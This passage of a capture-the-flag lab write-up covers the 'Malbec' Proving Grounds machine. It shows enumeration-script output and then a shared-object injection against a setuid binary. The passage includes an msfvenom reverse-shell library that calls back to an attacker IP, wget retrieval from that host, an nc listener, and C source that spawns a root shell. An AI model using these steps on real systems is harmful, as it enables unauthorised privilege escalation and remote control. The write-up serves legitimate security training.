[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/messenger
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'carlos' have mail?........................................ nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'carlos'.................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... yes!
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ nope
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ nope
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. yes!
---
/home/carlos/sv/malbec.exe
---
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
carlos@malbec:/tmp$ /usr/bin/messenger
/usr/bin/messenger
/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
carlos@malbec:/tmp$ 
```

## SUID Binary Analysis

```bash
carlos@malbec:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/messenger
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
carlos@malbec:/tmp$ /usr/bin/messenger
/usr/bin/messenger
/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
carlos@malbec:/tmp$ cp /usr/bin/messenger /home/carlos/sv/
cp /usr/bin/messenger /home/carlos/sv/
carlos@malbec:/tmp$ file /usr/bin/messenger
file /usr/bin/messenger
/usr/bin/messenger: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=36bed7948d27967d4c0b8a2499f0e249edef69a8, for GNU/Linux 3.2.0, not stripped
carlos@malbec:/tmp$ 
```

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ ftp 192.168.168.129 2121   
Connected to 192.168.168.129.
220 pyftpdlib 1.5.6 ready.
Name (192.168.168.129:kali): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rwxrwxrwx   1 carlos   carlos     108304 Jan 25  2021 malbec.exe
-rwxr-xr-x   1 carlos   carlos      16600 Mar 06 01:54 messenger
226 Transfer complete.
ftp> get messenger
local: messenger remote: messenger
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
16600 bytes received in 0.17 secs (95.5479 kB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ 
```

## Shared Object Injection

https://unix.stackexchange.com/questions/22926/where-do-executables-look-for-shared-objects-at-runtime

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.168 LPORT=7138 -f elf-so -o libmalbec.so                                                             130 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: libmalbec.so
                                                                                                                                           
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 2121                                                                      
Serving HTTP on 0.0.0.0 port 2121 (http://0.0.0.0:2121/) ...
192.168.168.129 - - [05/Mar/2022 21:01:54] "GET /libmalbec.so HTTP/1.1" 200 -

```

```bash
carlos@malbec:/tmp$ wget 192.168.49.168:2121/libmalbec.so
wget 192.168.49.168:2121/libmalbec.so
--2022-03-05 21:01:53--  http://192.168.49.168:2121/libmalbec.so
Connecting to 192.168.49.168:2121... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘libmalbec.so’

libmalbec.so        100%[===================>]     476  --.-KB/s    in 0s      

2022-03-05 21:01:53 (103 MB/s) - ‘libmalbec.so’ saved [476/476]

carlos@malbec:/tmp$ cp libmalbec.so /home/carlos
cp libmalbec.so /home/carlos
carlos@malbec:/tmp$ LD_LIBRARY_PATH=/tmp
LD_LIBRARY_PATH=/tmp
carlos@malbec:/tmp$ LD_LIBRARY_PATH=/home/carlos
LD_LIBRARY_PATH=/home/carlos
carlos@malbec:/tmp$ /usr/bin/messenger
/usr/bin/messenger

```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 7138                                                                                                                                                   1 ⨯
listening on [any] 7138 ...
connect to [192.168.49.168] from (UNKNOWN) [192.168.168.129] 34866
whoami
carlos
cd /root
/bin/sh: 2: cd: can't cd to /root
ls
libmalbec.so
lse.sh
systemd-private-b2517b53eee44c329edd1b57150de050-systemd-timesyncd.service-lpEH0l
vmware-root_414-592089511
wine-CXLOLL
```

You have to wait a while for the injection to work (i assume it is for the library paths to update)

```bash
carlos@malbec:~$ /usr/bin/messenger
/usr/bin/messenger
/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
carlos@malbec:~$ ^[[A
/usr/bin/messenger
carlos@malbec:~$ 
```

## Local Test

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ sudo chmod u+s /tmp/messenger 
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ ls -al /tmp/messenger 
-rwsr-xr-x 1 root root 16600 Mar  5 21:50 /tmp/messenger
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ 

┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ /tmp/messenger                                                                                                                                                127 ⨯
$ whoami
kali
$ 

```

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ /tmp/messenger # if the function is named main instead
/tmp/messenger: symbol lookup error: /tmp/messenger: undefined symbol: malbec
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Malbec]
└─$ 
┌──(kali㉿kali)-[/tmp]
└─$ sudo gcc -shared -fPIC  -o /usr/lib/libmalbec.so libmalbec.c
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat libmalbec.c          
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void malbec() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ /tmp/messenger                                       
┌──(root💀kali)-[/tmp]
└─# exit                                                                                                                                                                
exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## Remote Test

```bash
carlos@malbec:~$ wget 192.168.49.168:2121/libmalbec.c
wget 192.168.49.168:2121/libmalbec.c
--2022-03-05 21:56:06--  http://192.168.49.168:2121/libmalbec.c
Connecting to 192.168.49.168:2121... connected.
HTTP request sent, awaiting response... 200 OK
Length: 171 [text/x-csrc]
Saving to: ‘libmalbec.c’

libmalbec.c         100%[===================>]     171  --.-KB/s    in 0s      

2022-03-05 21:56:07 (51.5 MB/s) - ‘libmalbec.c’ saved [171/171]

carlos@malbec:~$ sudo gcc -shared -fPIC  -o libmalbec.so libmalbec.c
sudo gcc -shared -fPIC  -o libmalbec.so libmalbec.c

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for carlos: 

Sorry, try again.
[sudo] password for carlos: 

Sorry, try again.
[sudo] password for carlos: 

sudo: 3 incorrect password attempts
carlos@malbec:~$  gcc -shared -fPIC  -o libmalbec.so libmalbec.c
 gcc -shared -fPIC  -o libmalbec.so libmalbec.c
carlos@malbec:~$ /usr/bin/messenger
/usr/bin/messenger
/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
carlos@malbec:~$ ^[[A
/usr/bin/messenger
/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
carlos@malbec:~$ ^[[A
/usr/bin/messenger
root@malbec:~# cd /root
cd /root
root@malbec:/root# ls
ls
proof.txt
root@malbec:/root# cat proof.txt
cat proof.txt
bc0764d65da5f20af372fb6be00a7f33
root@malbec:/root# /sbin/ifconfig
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.168.129  netmask 255.255.255.0  broadcast 192.168.168.255
        ether 00:50:56:ba:93:b2  txqueuelen 1000  (Ethernet)
        RX packets 1305  bytes 83936 (81.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 155  bytes 17850 (17.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@malbec:/root# 

```

![](Pasted%20image%2020220306110017.png)
# Others

```bash
carlos@malbec:~$ gcc -shared -fPIC  -o libmalbec.so libmalbec.c
gcc -shared -fPIC  -o libmalbec.so libmalbec.c
carlos@malbec:~$ /usr/bin/messenger
/usr/bin/messenger
root@malbec:~# cat libmalbec.c
cat libmalbec.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
}
root@malbec:~# 
```